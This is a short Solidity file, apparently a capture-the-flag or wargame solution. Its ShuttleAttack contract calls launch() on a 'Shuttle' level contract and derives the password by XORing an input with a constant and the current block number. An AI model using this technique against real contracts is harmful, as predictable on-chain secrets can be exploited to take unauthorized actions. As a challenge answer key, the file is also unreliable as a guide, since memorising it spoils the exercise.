pragma solidity ^0.4.18;

import '../levels/Shuttle.sol';

contract ShuttleAttack {
  function attack(address _target, bytes32 _password) public {
    Shuttle shuttle = Shuttle(_target);
    bytes32 decrypt_pass = _password ^ bytes32(1000000000) ^ bytes32(block.number);
    shuttle.launch(decrypt_pass);
  }
}